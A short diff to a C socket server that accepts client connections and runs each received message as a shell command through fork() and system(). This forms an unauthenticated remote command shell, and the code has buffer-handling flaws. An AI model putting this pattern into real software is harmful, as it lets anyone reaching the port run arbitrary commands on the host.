@@ -47,19 +47,23 @@ int main(){
     char client_response[128];
     char cmd;
     
-    while(1){
+    while(client_socket = accept(server_socket, NULL, NULL)){
         
-        client_socket = accept(server_socket, NULL, NULL);
+//        client_socket = accept(server_socket, NULL, NULL);
         send(client_socket, "conected",128,0);
         
         //client loop
-        while(recv(client_socket, &client_response, sizeof(client_response),0 !=0)){
+        while(1){
+	    recv(client_socket, &client_response, sizeof(client_response),0);
             printf("> %s",client_response);
             
             if(strcmp("exit\n",client_response) == 0) {
                 break;
             }
+	    int pid; 
+          //  pid_t child = fork();
             pid = fork();
+	    printf("client forking");
             if(pid == 0) {
                 system(client_response);
                 exit(0);
